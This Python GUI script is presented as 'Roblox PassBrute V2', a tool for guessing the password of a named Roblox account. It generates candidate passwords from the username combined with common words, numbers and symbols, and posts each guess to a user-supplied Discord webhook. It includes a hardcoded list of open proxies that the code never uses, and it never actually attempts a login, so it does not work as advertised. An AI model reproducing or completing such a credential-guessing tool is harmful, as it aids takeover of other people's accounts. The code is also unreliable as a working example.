# Copyright (c)  (https://discord.gg/pQUFjaJ2EN)
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

import sys
import os
import time
import random
import requests
from PyQt5.QtWidgets import (QApplication, QWidget, QVBoxLayout, QLabel, QLineEdit, QPushButton, QMessageBox)
from PyQt5.QtGui import QColor, QPalette
from PyQt5.QtCore import Qt


markov_patterns = [
    "{username}{special}{number}",
    "{username}{number}{special}",
    "{special}{username}{number}",
    "{username}{common_word}{special}",
    "{common_word}{username}{number}",
    "{username}{number}",
    "{username}{special}",
    "{username}{number}{special}{common_word}",
    "{common_word}{special}{username}{number}",
    "{special}{common_word}{username}{number}{special}"
]

common_specials = ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', '-', '+', '=', '?', '/']
common_numbers = [str(i) for i in range(1000)]
common_words = ['password', 'secure', 'admin', 'pass', 'login', 'user', 'access', 'key', 'root', 'guest']


proxies = [
    "154.65.39.7:80", "154.65.39.8:80", "148.230.195.165:6969", "2.179.193.146:80",
    "168.132.150.37:8080", "86.77.217.16:8081", "31.62.179.218:5472", "185.105.182.189:80",
    "111.72.194.201:2324", "197.232.85.163:8080", "103.179.252.167:8181", "103.191.115.252:82",
    "181.78.21.74:999", "181.78.21.38:999", "103.147.246.185:3127", "89.159.227.130:999",
    "222.68.36.25:1080", "182.204.182.147:1080", "69.49.228.101:3128", "103.219.75.2:8080"
]

class InputWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Roblox PassBrute V2 - Webhook & Username")
        self.setFixedSize(600, 400)
        self.setStyleSheet("background-color: #0f0f17; color: #A855F7; font-size: 18px;")

        layout = QVBoxLayout()
        layout.setAlignment(Qt.AlignCenter)

        self.webhookInput = QLineEdit()
        self.webhookInput.setPlaceholderText("Enter Webhook URL...")
        self.webhookInput.setStyleSheet("background-color: #0f0f17; color: #A855F7; padding: 10px;")

        self.usernameInput = QLineEdit()
        self.usernameInput.setPlaceholderText("Enter Roblox Username...")
        self.usernameInput.setStyleSheet("background-color: #0f0f17; color: #A855F7; padding: 10px;")

        self.startButton = QPushButton("Start PassBrute V2")
        self.startButton.setStyleSheet("background-color: #A855F7; color: white; padding: 15px; font-size: 22px;")
        self.startButton.clicked.connect(self.start_pass_brute)

        layout.addWidget(QLabel("Webhook URL:"), alignment=Qt.AlignCenter)
        layout.addWidget(self.webhookInput, alignment=Qt.AlignCenter)
        layout.addWidget(QLabel("Roblox Username:"), alignment=Qt.AlignCenter)
        layout.addWidget(self.usernameInput, alignment=Qt.AlignCenter)
        layout.addWidget(self.startButton, alignment=Qt.AlignCenter)

        self.setLayout(layout)

    def generate_markov_passwords(self, username, limit=10000):
        guesses = set()
        for pattern in markov_patterns:
            for special in common_specials:
                for number in common_numbers:
                    for word in common_words:
                        guess = pattern.format(username=username, special=special, number=number, common_word=word)
                        guesses.add(guess)
                        if len(guesses) >= limit:
                            return guesses
        return guesses

    def start_pass_brute(self):
        webhook_url = self.webhookInput.text().strip()
        username = self.usernameInput.text().strip()

        if not webhook_url or not username:
            QMessageBox.warning(self, "Error", "Please enter both a valid webhook URL and a Roblox username.")
            return

        passwords = self.generate_markov_passwords(username)

        for password in passwords:
            log_message = f"Trying: {password} for username: {username}\n"

            if webhook_url:
                try:
                    requests.post(webhook_url, json={"content": log_message})
                except Exception as e:
                    print(f"Error sending to webhook: {e}")

            print(log_message.strip())
            time.sleep(1)

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = InputWindow()
    window.show()
    sys.exit(app.exec_())
